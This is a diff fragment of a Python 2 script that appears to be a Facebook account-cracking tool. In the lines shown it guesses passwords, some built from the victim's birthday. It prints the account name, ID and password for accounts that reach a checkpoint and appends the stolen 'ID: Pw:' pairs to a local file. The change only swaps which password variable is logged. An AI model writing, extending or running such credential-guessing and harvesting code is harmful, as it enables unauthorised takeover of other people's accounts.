@@ -414,11 +414,11 @@ def pilih_super():
 										if 'www.facebook.com' in q["error_msg"]:
                                                                                         print '\x1b[33;1m \x1b[0;1mNama \x1b[1;91m      : \x1b[0;1m' + a['name']
 											print '\x1b[33;1m[Cp+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
-											print '\x1b[33;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
+											print '\x1b[33;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
 											cek = open("out/super_cp.txt", "a")
-											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
+											cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 											cek.close()
-											cekpoint.append(user+pass4)
+											cekpoint.append(user+pass5)
 										else:
 											birthday = b['birthday']
 											pass6 = birthday.replace('/', '')
